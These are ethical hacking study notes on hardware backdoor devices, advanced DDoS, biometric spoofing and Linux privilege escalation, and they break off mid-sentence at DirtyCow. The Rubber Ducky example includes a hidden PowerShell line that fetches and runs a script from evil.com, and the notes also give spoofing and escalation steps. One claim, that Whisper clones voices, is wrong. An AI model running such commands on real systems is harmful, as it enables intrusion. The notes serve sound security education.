# Session 18 — Backdoor Devices · Advanced DDoS · Biometric Spoofing · Linux Hacking · Linux Backdoors · IDS/Honeypots/Firewalls 🔐

> Personal study notes | Ethical Hacking Module | CCEE Prep

---

## 📑 Table of Contents

- [🗺️ Where This Session Fits](#️-where-this-session-fits)
- [⚠️ Exam Traps & Misconceptions](#️-exam-traps--misconceptions)
- [🧱 Foundation Knowledge](#-foundation-knowledge)
- [Section 1 — Backdoor Devices](#section-1--backdoor-devices)
  - [1.1 What Is a Backdoor Device](#11-what-is-a-backdoor-device)
  - [1.2 Types of Backdoor Devices](#12-types-of-backdoor-devices)
  - [1.3 Hardware Implants](#13-hardware-implants)
  - [1.4 Firmware Backdoors](#14-firmware-backdoors)
  - [1.5 Backdoor Device Detection and Countermeasures](#15-backdoor-device-detection-and-countermeasures)
- [Section 2 — Distributed DoS — Advanced Concepts](#section-2--distributed-dos--advanced-concepts)
  - [2.1 Advanced DDoS Beyond Session 16A](#21-advanced-ddos-beyond-session-16a)
  - [2.2 Application Layer DDoS — Layer 7](#22-application-layer-ddos--layer-7)
  - [2.3 Multi-Vector DDoS](#23-multi-vector-ddos)
  - [2.4 DDoS as a Cover Attack](#24-ddos-as-a-cover-attack)
  - [2.5 Advanced DDoS Mitigation](#25-advanced-ddos-mitigation)
- [Section 3 — Biometric Spoofing](#section-3--biometric-spoofing)
  - [3.1 What Is Biometric Authentication](#31-what-is-biometric-authentication)
  - [3.2 Types of Biometric Systems](#32-types-of-biometric-systems)
  - [3.3 Biometric Spoofing Attacks](#33-biometric-spoofing-attacks)
  - [3.4 Fingerprint Spoofing](#34-fingerprint-spoofing)
  - [3.5 Facial Recognition Spoofing](#35-facial-recognition-spoofing)
  - [3.6 Iris and Retina Spoofing](#36-iris-and-retina-spoofing)
  - [3.7 Voice Recognition Spoofing](#37-voice-recognition-spoofing)
  - [3.8 Biometric Countermeasures](#38-biometric-countermeasures)
- [Section 4 — Linux Hacking](#section-4--linux-hacking)
  - [4.1 Why Linux Is Targeted](#41-why-linux-is-targeted)
  - [4.2 Linux Privilege Escalation](#42-linux-privilege-escalation)
  - [4.3 SUID and SGID Exploitation](#43-suid-and-sgid-exploitation)
  - [4.4 Cron Job Exploitation](#44-cron-job-exploitation)
  - [4.5 Linux Password File Attacks](#45-linux-password-file-attacks)
  - [4.6 Linux Network Attacks](#46-linux-network-attacks)
  - [4.7 Linux Enumeration Commands](#47-linux-enumeration-commands)
- [Section 5 — Linux Backdoors](#section-5--linux-backdoors)
  - [5.1 What Is a Linux Backdoor](#51-what-is-a-linux-backdoor)
  - [5.2 Types of Linux Backdoors](#52-types-of-linux-backdoors)
  - [5.3 Netcat Backdoor](#53-netcat-backdoor)
  - [5.4 SSH Backdoors](#54-ssh-backdoors)
  - [5.5 Rootkits on Linux](#55-rootkits-on-linux)
  - [5.6 Kernel-Level Rootkits](#56-kernel-level-rootkits)
  - [5.7 Linux Backdoor Detection](#57-linux-backdoor-detection)
- [Section 6 — Intrusion Detection Systems (IDS)](#section-6--intrusion-detection-systems-ids)
  - [6.1 What Is an IDS](#61-what-is-an-ids)
  - [6.2 IDS Types — NIDS vs HIDS](#62-ids-types--nids-vs-hids)
  - [6.3 IDS Detection Methods](#63-ids-detection-methods)
  - [6.4 IDS Evasion Techniques](#64-ids-evasion-techniques)
  - [6.5 Snort — The Reference NIDS](#65-snort--the-reference-nids)
- [Section 7 — Honeypots](#section-7--honeypots)
  - [7.1 What Is a Honeypot](#71-what-is-a-honeypot)
  - [7.2 Types of Honeypots](#72-types-of-honeypots)
  - [7.3 Honeypot Deployment Strategies](#73-honeypot-deployment-strategies)
  - [7.4 Honeypot Tools](#74-honeypot-tools)
  - [7.5 Legal Considerations of Honeypots](#75-legal-considerations-of-honeypots)
- [Section 8 — Firewalls](#section-8--firewalls)
  - [8.1 What Is a Firewall](#81-what-is-a-firewall)
  - [8.2 Types of Firewalls](#82-types-of-firewalls)
  - [8.3 Firewall Architectures](#83-firewall-architectures)
  - [8.4 Firewall Evasion Techniques](#84-firewall-evasion-techniques)
  - [8.5 Firewall Countermeasures and Best Practices](#85-firewall-countermeasures-and-best-practices)
- [📌 Extra Notes](#-extra-notes)
  - [E1 — IDS vs IPS vs Firewall — Full Comparison](#e1--ids-vs-ips-vs-firewall--full-comparison)
  - [E2 — Snort Rule Syntax Deep Dive](#e2--snort-rule-syntax-deep-dive)
  - [E3 — Linux Rootkit Detection Tools](#e3--linux-rootkit-detection-tools)
  - [E4 — Biometric Error Rates — FAR vs FRR vs EER](#e4--biometric-error-rates--far-vs-frr-vs-eer)
  - [E5 — DMZ Architecture](#e5--dmz-architecture)
  - [E6 — Hardware Security Modules vs Backdoor Devices](#e6--hardware-security-modules-vs-backdoor-devices)
  - [E7 — NAGIOS and SNORT as IDS/IPS](#e7--nagios-and-snort-as-idsips)
  - [E8 — Predecessor / Successor Chains](#e8--predecessor--successor-chains)
  - [E9 — Terminology Traps](#e9--terminology-traps)
  - [E10 — Current Landscape 2026](#e10--current-landscape-2026)
  - [E11 — Indian Legal Context](#e11--indian-legal-context)
- [Abbreviations Table](#abbreviations-table)
- [🔑 Keywords + Concept Map](#-keywords--concept-map)
- [⚡ Quick Reference Cheatsheet](#-quick-reference-cheatsheet)
- [✅ Session Revision Snapshot](#-session-revision-snapshot)
- [Next Session Bridge](#next-session-bridge)
- [📖 Glossary](#-glossary)

---

## 🗺️ Where This Session Fits

    Module 05 — Security Concepts
    └── Part B — Ethical Hacking (Sessions 6–20)
        ├── Sessions 6–9    : Concepts, Principles, Hacker Classes
        ├── Sessions 10–11  : Recon, Scanning, Enumeration, Passwords
        ├── Session 12A     : Password Countermeasures · Keyloggers
        ├── Session 12B     : Trojans · Backdoors · Reverse Shells
        ├── Session 13      : Trojan Construction · Wrapping · Evasion
        ├── Session 14      : Viruses · Worms · AV Evasion
        ├── Session 15      : Sniffing · ARP Poisoning · DNS Attacks
        ├── Session 16A     : DoS · DDoS · BOTs/BOTNETs · Smurf · SYN Flood
        ├── Session 16B     : Spoofing vs Hijacking · Session Hijacking
        ├── Session 17A     : Web Server Hacking · Web App Vulnerabilities
        ├── Session 17B     : Wireless Hacking · WEP/WPA · SSID/MAC Spoofing
        ├── ▶ SESSION 18    : Backdoor Devices · Advanced DDoS
        │                     Biometric Spoofing · Linux Hacking
        │                     Linux Backdoors · IDS/Honeypots/Firewalls
        │                                          ← YOU ARE HERE
        └── Sessions 19–20  : Physical Security · Pen Testing · Malware RE

**Phase position:** Session 18 is a broad convergence session —
it revisits and deepens several earlier themes (backdoors from
Session 12B, DDoS from Session 16A, biometrics as an authentication
layer) while introducing the DEFENSIVE infrastructure: IDS,
honeypots, and firewalls. Understanding how defences work is
essential for understanding how attackers evade them.

The Linux section is particularly important — Linux powers the
majority of servers, cloud instances, and network infrastructure.
Linux hacking and backdoor techniques directly apply to server
compromise, post-exploitation, and persistence.

---

## ⚠️ Exam Traps & Misconceptions

| ❌ Misconception | ✅ Reality |
|---|---|
| IDS and IPS are the same | IDS DETECTS and ALERTS — it does NOT block. IPS DETECTS and ACTIVELY BLOCKS/DROPS malicious traffic. IDS is passive; IPS is inline and active. |
| A firewall is the same as an IDS | A firewall CONTROLS what traffic is ALLOWED based on rules (port, IP, protocol). An IDS MONITORS allowed traffic for suspicious patterns. A firewall does not detect attacks within permitted traffic. |
| Honeypots are illegal because they entrap attackers | Honeypots are legal in most jurisdictions — they do not solicit attacks, they merely present an attractive target. The attacker initiates — entrapment requires inducement. However, evidence collected via honeypots has legal admissibility requirements. |
| Signature-based IDS catches all attacks | Signature-based IDS only catches KNOWN attack patterns with existing signatures. Zero-day attacks, novel malware, and obfuscated attacks evade signature IDS entirely. |
| A biometric system cannot be fooled | ALL biometric systems have a False Accept Rate (FAR) greater than zero — meaning they CAN be fooled. Presentation attacks using fake fingerprints, photos, or voice recordings have succeeded against commercial systems. |
| SUID bit exploits require kernel vulnerabilities | SUID exploits leverage MISCONFIGURED programs (editors, shells, scripting languages) that run as root — not kernel bugs. SUID on dangerous binaries like vim, bash, python is the common vulnerability. |
| Linux is inherently more secure than Windows | Linux's security depends entirely on configuration. Misconfigurations (world-writable files, SUID abuses, weak sudoers, exposed services) create serious vulnerabilities. Linux with poor config is as exploitable as any OS. |
| Netcat is only a hacking tool | Netcat is a LEGITIMATE network utility (like nc) used by administrators for port testing, file transfer, and diagnostics. Its dual-use nature makes it present on many systems — attackers use it for backdoors because it is already installed. |
| A stateful firewall is the same as a NGFW | Stateful firewalls track connection state (Layer 3/4). NGFWs add deep packet inspection, application awareness (Layer 7), user identity tracking, SSL inspection, and threat intelligence — significantly more capable. |
| Anomaly-based IDS has no false positives | Anomaly-based IDS has HIGHER false positive rates than signature-based — legitimate but unusual traffic (backups, software updates, new applications) triggers alerts because it deviates from the learned baseline. |

---

## 🧱 Foundation Knowledge

<details>
<summary>Click to expand — Must-know before this session</summary>

**Linux File Permission Basics**

    Permission format: rwxrwxrwx
    r = read (4), w = write (2), x = execute (1)

    Example: -rwsr-xr-x 1 root root /usr/bin/passwd
              ↑
              s = SUID bit — execute with owner's privileges (root)

    Check SUID files:
    find / -perm -u=s -type f 2>/dev/null

**Linux /etc/passwd and /etc/shadow**

    /etc/passwd  — world-readable — username, UID, GID, home, shell
    /etc/shadow  — root-readable only — password hashes, expiry

    Format /etc/passwd:
    username:x:uid:gid:comment:home_dir:shell
    root:x:0:0:root:/root:/bin/bash

    Format /etc/shadow:
    username:$algorithm$salt$hash:last_changed:min:max:warn:inactive:expire

    Hash algorithms: $1$=MD5, $5$=SHA-256, $6$=SHA-512

**OSI Layers for Firewall/IDS Classification**

| Layer | Name | What Firewall/IDS Examines |
|---|---|---|
| L3 | Network | IP addresses, routing |
| L4 | Transport | TCP/UDP ports, connection state |
| L7 | Application | HTTP, DNS, FTP payload content |

**MITRE ATT&CK Reference**

- T1542 — Pre-OS Boot (firmware backdoors)
- T1014 — Rootkit
- T1078 — Valid Accounts (backdoor via SSH keys)
- T1098 — Account Manipulation
- T1548 — Abuse Elevation Control (SUID)
- T1562 — Impair Defenses (disable IDS/firewall)
- T1055 — Process Injection
- T1087 — Account Discovery (Linux enumeration)

</details>

---

## Section 1 — Backdoor Devices

### 1.1 What Is a Backdoor Device

**WHAT:**
A backdoor device is a **physical hardware component** — either
purpose-built malicious hardware or legitimately-looking hardware
modified to contain hidden functionality — that provides covert
access to a system, network, or physical space without the owner's
knowledge.

**WHY it matters:**
Software backdoors can be detected by antivirus, EDR, and file
integrity monitoring. Hardware backdoors operate below the OS and
software layer — they are invisible to all software-based security
tools. Physical access or supply chain compromise is required to
detect them.

**Distinction from software backdoors:**

| Property | Software Backdoor | Hardware Backdoor Device |
|---|---|---|
| **Detectability** | Antivirus, FIM, EDR | Physical inspection, RF scanning |
| **OS visibility** | Yes — process, file, registry | No — operates below OS |
| **Persistence** | Survives if OS reinstalled? Often no | Survives OS wipe — always |
| **Delivery** | Phishing, exploit, drive-by | Physical access, supply chain |
| **Examples** | Netcat listener, SSH key | USB implant, modified NIC |

---

### 1.2 Types of Backdoor Devices

| Category | Description | Examples |
|---|---|---|
| **USB Implants** | Modified USB devices that perform malicious actions when plugged in | USB Rubber Ducky, O.MG Cable, USB Killer |
| **Network Implants** | Devices inserted into network infrastructure providing covert access | LAN Turtle, Packet Squirrel, Throwing Star LAN Tap |
| **Hardware Keyloggers** | Physical devices between keyboard and computer capturing keystrokes | PS/2 and USB hardware keyloggers, KeyGrabber |
| **Firmware Implants** | Malicious code embedded in device firmware (BIOS, UEFI, NIC, HDD) | NSA ANT catalog implants, implants in HDD firmware |
| **Rogue Network Devices** | Unauthorized routers, switches, or APs providing network access | Pineapple, rogue switches, unauthorized Wi-Fi APs |
| **Screen Scrapers** | Hardware that captures HDMI/VGA output from a display | HDMI splitter with capture card |

---

### 1.3 Hardware Implants

**USB Rubber Ducky:**
A USB device that appears as a standard USB keyboard to the OS.
Automatically types a pre-programmed keystroke payload at
1000+ keystrokes per second — executing malicious commands
in seconds before any user can intervene.

    Attack flow:
    Attacker plants Rubber Ducky in target USB port
            ↓
    OS sees: "USB HID keyboard connected"
            ↓
    Rubber Ducky types payload at 1000 keys/sec:
    powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
            ↓
    PowerShell downloads and executes backdoor in memory
    Entire attack: under 5 seconds

**O.MG Cable:**
A Lightning or USB-C cable that appears completely identical
to a legitimate Apple or charging cable — but contains an
embedded Wi-Fi hotspot and a microcontroller that executes
payloads remotely. Attacker connects to the cable over Wi-Fi
from nearby and sends keystroke commands.

**LAN Turtle:**
A small device in a USB Ethernet adapter form factor.
When inserted into a computer's USB port or inline in a
network cable — provides covert SSH tunnel back to attacker,
DNS spoofing, and network monitoring capabilities.

**Packet Squirrel:**
Inline network tap — inserted between a computer and its
network switch. Captures all traffic, can perform MITM,
DNS spoofing, and provides an OpenVPN tunnel to the attacker.

**USB Killer:**
Delivers a high-voltage pulse (~200V) repeatedly into the
USB port — destroys the host computer's USB controller and
often the motherboard. Used for hardware destruction attacks.

> [!WARNING]
> Even charging cables and USB chargers can be implanted with
> attack hardware. The O.MG Cable demonstrated that a cable
> indistinguishable from a legitimate Apple cable can provide
> full remote keystroke injection. Never use charging cables
> from unknown sources.

---

### 1.4 Firmware Backdoors

**WHAT:**
Firmware backdoors embed malicious code into device firmware —
the low-level software that controls hardware (BIOS, UEFI,
NIC firmware, HDD/SSD controller firmware, router firmware).

**WHY firmware backdoors are particularly dangerous:**
- Survive complete OS reinstallation (not on the OS drive)
- Invisible to all OS-level security tools (AV, EDR, FIM)
- Often survive even drive replacement (NIC firmware persists)
- Very difficult to detect and remove without specialized tools
- Can re-infect a clean OS after reinstallation

**NSA ANT Catalog (leaked 2013):**
Documents revealed by Edward Snowden showed the NSA's
hardware implant catalog including:
- **COTTONMOUTH**: USB hardware implant with wireless transceiver
- **IRATEMONK**: HDD firmware implant persisting across OS reinstall
- **DEITYBOUNCE**: BIOS implant for Dell PowerEdge servers
- **JETPLOW**: Cisco firewall firmware implant

**Equation Group HDD Firmware (2015 — Kaspersky discovery):**
Malware implanted in HDD firmware of Seagate, Western Digital,
Maxtor, Samsung, IBM hard drives — surviving low-level format.
The malware created a hidden storage area in firmware that
persisted regardless of OS reinstallation.

**UEFI Rootkits (2022+ — ongoing):**
CosmicStrand, BlackLotus, MosaicRegressor — UEFI firmware
rootkits surviving complete drive replacement. BlackLotus
(2023) became the first publicly known UEFI bootkit to
bypass Secure Boot on Windows 11.

**Countermeasures:**

| Control | What It Does |
|---|---|
| **Secure Boot** | Validates firmware signatures before loading — blocks unsigned firmware |
| **UEFI firmware signing** | Manufacturer-signed firmware — unsigned modifications rejected |
| **Firmware integrity verification** | Hash current firmware against known-good baseline |
| **Supply chain verification** | Hash-verify all hardware before deployment |
| **Physical tamper detection** | Tamper-evident seals on hardware |
| **BIOS passwords** | Prevent unauthorized firmware modification |

---

### 1.5 Backdoor Device Detection and Countermeasures

| Detection Method | What It Finds |
|---|---|
| **Physical inspection** | Devices inserted inline (between keyboard and computer, network cable taps) |
| **RF scanning** | Wireless implants transmitting on unexpected frequencies |
| **USB device auditing** | Monitoring all USB device connections — flag unknown HID devices |
| **Network traffic analysis** | Unexpected outbound connections from infrastructure devices |
| **Firmware hash verification** | Compare current firmware hash to vendor-published known-good |
| **Device inventory management** | All network devices tracked — unauthorized devices flagged |
| **X-ray inspection (high security)** | Internal hardware component inspection without disassembly |

---

## Section 2 — Distributed DoS — Advanced Concepts

### 2.1 Advanced DDoS Beyond Session 16A

Session 16A covered DoS/DDoS fundamentals, botnets, Smurf,
and SYN flooding. This section covers the **advanced and
current DDoS landscape** — multi-vector attacks, application
layer sophistication, and modern mitigation strategies.

**Advanced DDoS characteristics:**

| Property | Basic DDoS (Session 16A) | Advanced DDoS (Session 18) |
|---|---|---|
| **Attack layer** | Primarily L3/L4 (network/transport) | L3/L4/L7 simultaneously |
| **Attack vectors** | Single method | Multi-vector — simultaneous |
| **Traffic pattern** | Sustained flood | Pulsed, burst, adaptive |
| **Bot sophistication** | Simple flood bots | Sophisticated — mimic legitimate traffic |
| **Mitigation evasion** | No adaptation | Adapts in real time to mitigations |
| **Scale** | Gbps | Tbps — record 3.47 Tbps (Azure 2022) |

---

### 2.2 Application Layer DDoS — Layer 7

**WHAT:**
Layer 7 DDoS attacks generate **legitimate-looking application
requests** that exhaust server resources — web server threads,
database connections, API call budgets, or application logic.
Network-level mitigation (blocking IPs, rate limiting by volume)
does not detect these attacks because each individual request
is indistinguishable from legitimate traffic.

**HTTP/2 Rapid Reset (CVE-2023-44487 — 2023):**
The most sophisticated application-layer attack ever discovered.

    Normal HTTP/2 stream:
    Client opens stream → sends request → server processes → client receives response

    HTTP/2 Rapid Reset attack:
    Client opens stream → sends request → immediately sends RST_STREAM (cancel)
    Server must allocate resources for the request before receiving RST
    → Server processes cancel → de-allocates resources
    → Client immediately opens new stream → RST → new stream → RST...

    At scale: 398 million requests per second
    Server CPU exhausted processing cancellations — cannot serve legitimate users
    Each "request" uses almost zero attacker bandwidth
    Highly asymmetric — devastating attack with minimal attacker resources

**Advanced HTTP Flood:**
Modern HTTP flood bots:
- Use valid TLS certificates and real browser fingerprints
- Send HTTP/2 and HTTP/3 (QUIC) requests
- Maintain cookies and session state like real browsers
- Execute JavaScript challenges (CAPTCHA bypassing services)
- Randomize User-Agent, IP (residential proxies), request patterns
- Target computationally expensive endpoints (search, login, reporting)

**Slow HTTP Attacks recap:**

| Attack | Method | Server Exhausted |
|---|---|---|
| Slowloris | Send partial HTTP headers — add one header/10 seconds | Connection pool |
| RUDY (R-U-Dead-Yet) | Send HTTP POST body one byte at a time | Connection pool |
| Slow Read | Advertise tiny TCP receive window | Send buffer |

---

### 2.3 Multi-Vector DDoS

**WHAT:**
A multi-vector DDoS simultaneously deploys multiple attack
types — volumetric, protocol, and application — so that
mitigating one vector leaves others continuing to damage
availability.

**Typical multi-vector sequence:**

    Phase 1 — Volumetric flood:
    UDP/DNS amplification → saturate uplink bandwidth
    Mitigation: null routing / BGP blackhole applied
            ↓
    Phase 2 — Protocol attack:
    SYN flood → exhaust connection state tables
    Mitigation: SYN cookies enabled / firewall proxy applied
            ↓
    Phase 3 — Application attack:
    HTTP flood + Slowloris → exhaust web server resources
    Mitigation: CDN absorbs HTTP — Slowloris rate limiting applied
            ↓
    Phase 4 — Adaptive re-attack:
    Attacker observes which mitigation was applied
    Switches to different amplification protocol / different endpoint
    Mitigation: ongoing adaptation required

**Why multi-vector is effective:**
Each mitigation measure for one vector typically does not
help with other vectors — often interferes. Null routing
stops volumetric but kills all traffic including legitimate.
SYN cookies help with SYN flood but not HTTP exhaustion.
The defender must operate all mitigations simultaneously.

---

### 2.4 DDoS as a Cover Attack

**WHAT:**
Attackers use a DDoS attack as a **distraction or cover** for
a simultaneous breach — the DDoS draws security team attention
and exhausts incident response resources while the real
intrusion occurs on a different system.

**Pattern:**

    Phase 1 — DDoS launched against public-facing infrastructure:
    Web servers, DNS, CDN flooded
    SOC team: all hands on deck for DDoS response
    Monitoring dashboards show millions of alerts
            ↓
    Phase 2 — Breach occurs simultaneously on different system:
    VPN appliance exploit / phishing credential use / RDP access
    SOC team: overwhelmed with DDoS alerts → breach alerts lost in noise
            ↓
    Phase 3 — Attacker establishes persistence during DDoS:
    Lateral movement, data exfiltration, backdoor installation
    All occurring while SOC focused on DDoS mitigation
            ↓
    Phase 4 — DDoS stops:
    SOC declares victory on DDoS
    Later discovers breach — significant dwell time elapsed

**Real case:** 2012 US bank DDoS attacks (Operation Ababil) —
DDoS against major US banks preceded fraud operations on the
same banks' systems during the attack window.

---

### 2.5 Advanced DDoS Mitigation

| Technique | How It Works | What It Stops |
|---|---|---|
| **Anycast diffusion** | Route victim IP to multiple global PoPs — distribute traffic | Volumetric — no single point overwhelmed |
| **BGP flowspec** | Programmatic BGP rules to drop specific traffic at ISP level | Volumetric — precise traffic dropping |
| **Scrubbing centers** | Inspect all traffic — remove attack packets — forward clean | All types — deep packet inspection |
| **Rate limiting per client fingerprint** | Limit requests per TLS fingerprint, HTTP2 fingerprint, IP | L7 flood — even with IP rotation |
| **CAPTCHA / JS challenge** | Challenge all clients — bots cannot solve — legitimate users can | L7 HTTP flood |
| **Traffic baseline ML** | ML model identifies anomalous patterns in real time | Novel/adaptive attacks |
| **CDN absorption** | Global CDN with massive capacity absorbs L7 traffic | HTTP flood — distributed across PoPs |
| **DDoS-as-a-Service mitigation** | AWS Shield Advanced, Cloudflare Magic Transit, Akamai Prolexic | Enterprise-grade all-type mitigation |

---

## Section 3 — Biometric Spoofing

### 3.1 What Is Biometric Authentication

**WHAT:**
Biometric authentication uses **unique physical or behavioral
characteristics** of a person to verify their identity —
replacing or supplementing password-based authentication.

**Types of biometric characteristics:**

| Category | Examples |
|---|---|
| **Physiological** | Fingerprint, iris, retina, facial geometry, hand geometry, DNA |
| **Behavioral** | Voice pattern, gait, keystroke dynamics, signature |

**Why biometrics are used:**
- Cannot be forgotten (unlike passwords)
- Cannot be easily transferred to another person
- Difficult to share (unlike PINs or passwords)
- Provides non-repudiation (harder to deny being present)

**Why biometrics are vulnerable:**
- Cannot be changed if compromised (unlike passwords — you cannot
  change your fingerprint)
- Biometric data can be captured without the person's knowledge
  (fingerprints left on surfaces, facial images from photos)
- Presentation attacks using physical or digital artifacts
- Template database theft — compromises the biometric permanently

---

### 3.2 Types of Biometric Systems

| System | Characteristic Measured | Common Use Cases |
|---|---|---|
| **Fingerprint** | Ridge patterns on fingertip | Smartphones, border control, time-attendance |
| **Facial recognition** | Facial geometry — distance between features | Smartphones, CCTV, access control |
| **Iris recognition** | Iris pattern — complex and unique | High-security access control, border control |
| **Retina recognition** | Blood vessel pattern at back of eye | Highest security — rarely deployed |
| **Voice recognition** | Voiceprint — frequency, tone, cadence | Phone banking, smart speakers |
| **Hand geometry** | Shape and size of hand | Physical access control |
| **Keystroke dynamics** | Typing rhythm — dwell/flight times | Continuous authentication |
| **Gait analysis** | Walking pattern — video-based | Surveillance, covert identification |
| **Vein pattern** | Vein structure in finger or palm | Banking ATMs (Japan, Europe) |

---

### 3.3 Biometric Spoofing Attacks

**WHAT:**
Biometric spoofing (also called **presentation attack** or
**liveness attack**) is the use of artificial or reproduced
biometric artifacts to fool a biometric sensor into authenticating
an unauthorized person.

**Attack categories:**

| Category | Description |
|---|---|
| **Presentation attack** | Present a fake biometric artifact to the sensor (fake finger, photo, recording) |
| **Replay attack** | Inject previously captured digital biometric data directly into the system |
| **Template attack** | Compromise the stored template database — modify or replace enrolled templates |
| **Adversarial attack** | Apply imperceptible digital perturbations to fool ML-based biometric classifiers |
| **Side-channel attack** | Extract biometric data from RF emissions or power analysis of the sensor |

**General biometric attack surface:**

    Biometric data source (person)
            ↓
    Sensor → ATTACK POINT 1: Presentation of fake artifact
            ↓
    Feature extraction → ATTACK POINT 2: Replay/inject digital features
            ↓
    Matcher → ATTACK POINT 3: Adversarial input to fool ML classifier
            ↓
    Template database → ATTACK POINT 4: Template theft / substitution
            ↓
    Decision (Accept/Reject)

---

### 3.4 Fingerprint Spoofing

**WHAT:**
Fingerprint spoofing presents a **fake fingerprint artifact**
(also called a spoof finger or gummy finger) to a fingerprint
scanner to authenticate as an enrolled person.

**How fingerprints are captured:**

    Method 1 — Latent print lifting:
    Target touches smooth surface (glass, phone screen, door handle)
    Fingerprint residue (sebum + sweat) left on surface
    Attacker uses fingerprint powder (like forensics)
    Tape lifts the fingerprint impression

    Method 2 — High-resolution photography:
    High-res photo of fingerprint from glass or polished surface
    Inverted → printed on transparency at 1200 DPI
    Used as mold template

**How fake fingers are created:**

    Material 1 — Gelatin (gummy finger):
    Dissolve gelatin powder in warm water
    Pour onto negative mold made from fingerprint impression
    Allow to set → flexible, skin-like material
    → Most fingerprint scanners accept gelatin fingers

    Material 2 — Silicone (more durable):
    Medical-grade silicone poured into mold
    Better texture simulation → fools capacitive sensors

    Material 3 — 2D printed fingerprint:
    Print fingerprint image on conductive ink paper
    Works against some optical fingerprint scanners

**Sensors and their vulnerabilities:**

| Sensor Type | Technology | Spoofing Resistance |
|---|---|---|
| **Optical** | Camera captures image | Low — printed 2D image can fool |
| **Capacitive** | Electrical capacitance of ridges | Medium — gelatin fools most |
| **Ultrasonic** | 3D subsurface scan | Higher — Qualcomm 3D Sonic |
| **Thermal** | Temperature difference of ridges | Medium — warm gelatin fools it |
| **Multispectral** | Multiple wavelengths including subsurface | Highest — hardest to fool |

> [!NOTE]
> The famous 2013 demonstration by the Chaos Computer Club (CCC)
> showed that the iPhone 5S's Touch ID could be bypassed using a
> gelatin fake finger made from a lifted fingerprint 24 hours
> after the phone's release. This established that even
> consumer-grade biometric systems are vulnerable to basic
> presentation attacks.

---

### 3.5 Facial Recognition Spoofing

**2D Photo Attack:**

    Attacker obtains victim's photo (social media, ID card, driver's license)
    Prints at full size on high-quality paper or displays on phone screen
    Holds printed photo in front of facial recognition camera
    System compares stored template → accepts photo as face

    Works against: basic 2D recognition systems
    Defeated by: liveness detection (blink detection, head turn, depth sensing)

**3D Mask Attack:**

    Attacker creates 3D-printed or silicone mask of victim's face
    Uses victim's photos from multiple angles (social media provides this)
    Photogrammetry software generates 3D model from 2D photos
    3D printer outputs face structure
    Silicone layer adds realistic skin texture and color

    Works against: depth-sensing systems that detect 2D photo
    Defeated by: thermal imaging, infrared depth sensing (Face ID)

**DeepFake Video Attack:**

    Attacker generates deepfake video of victim in real time
    Injects deepfake stream into video authentication system
    Fools liveness checks that expect movement — deepfake moves

    Works against: software liveness detection without hardware challenge
    Defeated by: hardware-level 3D/IR face scanning, challenge-response

**Apple Face ID (True Depth Camera):**
Uses structured light (30,000 infrared dots) to create a precise
3D depth map — combined with infrared image — making 2D photo
and even detailed 3D masks significantly harder to spoof.

---

### 3.6 Iris and Retina Spoofing

**Iris Spoofing:**

    Method 1 — High-resolution iris photo:
    Capture high-resolution image of target's iris
    Print at 1200 DPI on transparency or paper
    Cut hole in printout where pupil is (some sensors check pupil)
    Hold printout in front of iris camera
    Works against: simple IR iris scanners

    Method 2 — Printed contact lens:
    Print iris pattern on custom contact lens
    Lens worn over attacker's eye
    Sensor sees attacker's eye shape + victim's iris pattern

    Method 3 — Post-mortem attack:
    Deceased person's eyes retain valid iris pattern for hours
    Used in forensics and attacks on critical systems

**Retina Recognition:**
Far more difficult to spoof — the retina is at the back of the
eye, scanned by low-intensity infrared laser. No external
artifact can plausibly replicate the subsurface blood vessel
pattern at the correct depth. Rarely deployed commercially
due to user discomfort and cost.

---

### 3.7 Voice Recognition Spoofing

**Replay Attack:**

    Attacker records victim's voice using directional microphone
    from public events, phone calls, video recordings
            ↓
    Playback of recording to voice authentication system
            ↓
    System compares voiceprint → authenticates

    Defeated by: liveness detection — random phrase challenge
    "Please say: blue elephant Tuesday forty-seven"
    Attacker cannot have pre-recorded this exact phrase

**Voice Synthesis (AI Text-to-Speech):**

    Modern TTS systems (ElevenLabs, VALL-E, Whisper) can clone
    a voice from as little as 3–5 seconds of audio
    Generate any phrase in the cloned voice
    Use synthesized audio against voice authentication

    Works against: systems without strong liveness challenge
    Concern: synthesized voice quality now matches real voice

**Adversarial audio:**
Imperceptible perturbations added to audio that fool voice
recognition ML models — humans cannot hear the difference
but the system recognizes a different "voiceprint."

---

### 3.8 Biometric Countermeasures

| Countermeasure | What It Prevents |
|---|---|
| **Liveness detection** | Presentation attacks — confirms live person present |
| **Multi-modal biometrics** | Requires two biometric factors (fingerprint + iris) — harder to spoof both |
| **Challenge-response** | Random prompts (specific phrase, head movement, blink) — defeats replays |
| **Behavioral biometrics** | Combine with typing rhythm, gait — harder to fully reproduce |
| **Hardware-level 3D sensing** | Depth + IR maps (Face ID) — defeats 2D photos and flat masks |
| **Pulse/blood flow detection** | Confirms living tissue — defeats fake fingers |
| **Encrypted template storage** | Compromise of template DB does not reveal raw biometric |
| **Fuzzy vault / cancelable biometrics** | Transform biometric template — can be cancelled and re-enrolled if compromised |
| **Multi-factor: biometric + PIN** | Even if biometric spoofed, PIN still required |

**Biometric error rate trade-offs:**

| Setting | FAR | FRR | Use Case |
|---|---|---|---|
| High security | Very low | Higher | Nuclear facility — few false accepts tolerated |
| Balanced (EER) | Equal to FRR | Equal to FAR | General enterprise — balanced |
| High convenience | Higher | Very low | Consumer device — prefer to accept than reject |

---

## Section 4 — Linux Hacking

### 4.1 Why Linux Is Targeted

- Powers ~96% of the world's top 1 million web servers
- Runs most cloud infrastructure (AWS EC2, Azure VMs, GCP)
- Default OS for network infrastructure (routers, firewalls, switches)
- Used in Android smartphones (Linux kernel)
- Runs IoT devices, industrial control systems, scientific computing
- Root = complete system control (vs Windows Administrator)
- Many services run as root by default (legacy configs)

---

### 4.2 Linux Privilege Escalation

**WHAT:**
Privilege escalation on Linux means gaining **root (uid=0)**
access from a lower-privileged user account — the goal of
most Linux post-exploitation.

**Escalation vectors:**

| Vector | Method |
|---|---|
| **Kernel exploit** | Exploit unpatched kernel vulnerability — DirtyCow (CVE-2016-5195) |
| **SUID/SGID abuse** | Execute SUID binary as root — drop shell (see Section 4.3) |
| **Sudo misconfiguration** | Sudo allows specific commands — abuse them to get root shell |
| **Cron job exploitation** | World-writable script run by root cron — replace with reverse shell |
| **PATH injection** | Script called without full path → attacker's malicious binary executes as root |
| **Writable /etc/passwd** | Add new root user if /etc/passwd is world-writable |
| **NFS root squashing disabled** | Mount NFS share — create SUID binary — execute as root on server |
| **LD_PRELOAD abuse** | Inject malicious library via LD_PRELOAD in sudo environment |
| **Docker socket abuse** | Docker group membership → mount host filesystem → escape container |

**DirtyCow (CVE-2016-5195):**
Famous Linux kernel race condition exploit — allowed local user
